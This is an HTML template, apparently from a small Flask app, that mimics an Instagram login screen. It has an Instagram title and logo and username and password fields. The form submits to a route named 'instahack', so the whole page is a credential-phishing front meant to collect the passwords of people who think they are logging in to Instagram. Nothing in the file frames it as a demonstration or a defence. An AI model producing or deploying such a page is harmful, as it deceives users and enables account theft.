<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link rel="stylesheet" href="static/style.css">
	<link rel="shortcut icon" href="./static/images/favicon.ico" type="image/x-icon">
	<title>Login â€¢ Instagram</title>
  </head>

<body>
	<div class="container">
		<div class="screen">
			<div class="screen__content">
				<div class="logo">
					<img src="./static/images/logo.png" alt="logo">
				  </div>
				<form class="login" action="{{url_for('instahack')}}" method="post">
					<div class="login__field">
						<i class="login__icon fas fa-user"></i>
						<input class="login__input" type="text" placeholder="Username"
							id="username" name="uname">
					</div>
					<div class="login__field">
						<i class="login__icon fas fa-lock"></i>
						<input class="login__input" type="password" placeholder="Password" id="password" name="pword">
					</div>
					<button class="button login__submit">
						<span class="button__text">Log In Now</span>
						<i class="button__icon fas fa-chevron-right"></i>
					</button>
				</form>
			</div>
			<div class="screen__background">
				<span class="screen__background__shape screen__background__shape4"></span>
				<span class="screen__background__shape screen__background__shape3"></span>
				<span class="screen__background__shape screen__background__shape2"></span>
				<span class="screen__background__shape screen__background__shape1"></span>
			</div>
		</div>
	</div>

</body>

</html>
